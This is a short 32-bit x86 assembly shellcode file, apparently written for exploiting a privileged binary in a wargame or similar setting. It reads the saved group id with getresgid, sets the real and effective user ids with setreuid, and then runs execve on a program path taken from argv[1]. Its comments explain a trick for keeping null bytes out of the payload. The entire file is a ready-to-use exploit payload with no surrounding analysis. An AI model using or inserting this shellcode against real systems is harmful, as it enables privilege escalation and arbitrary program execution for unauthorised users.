bits 32

global _start
section .text

_start:
    mov ebp, esp        ; get some storage space for getresgid
    add ebp, 0x20

    ; gerresgid() -- store ebp = rgid, ebp+0x4 = egid, ebp+0x8 = sgid
    push 0x7f           ; need 0xab in eax to call getresgid
    pop eax             ; but push 0xab results in null bytes
    add eax, 0x2c       ; so, obnoxious workaround: put 0x7f in eax, then add 0x2c
    mov ebx, ebp        ; &rgid arg
    mov ecx, ebp
    add ecx, 0x4        ; &egid arg
    mov edx, ebp
    add edx, 0x8        ; &sgid arg
    int 0x80
    mov edi, eax        ; store result (0 for success)

    ; setreuid(sgid, sgid)
    mov ebx, [ebp+0x8]  ; arg0
    mov ecx, ebx        ; arg1
    push 0x46
    pop eax             ; syscall # for setreuid
    int 0x80
    mov esi, eax        ; store result (0 for success)
    
    ; execve(argv[1], NULL, NULL) TODO might need give non-NULL args
    push 0x0b           ; syscall # for execve
    pop eax
    mov ebx, [esp+4]    ; execve arg0 (pointer to argv[1] aka strpayload)
    ; mov ecx, [esp+8]    ; execve arg1 (pointer to argv[2], null string)
    ; mov edx, ecx        ; execve arg2 (pointer to argv[2], null string)
    xor ecx, ecx
    xor edx, edx
    int 0x80
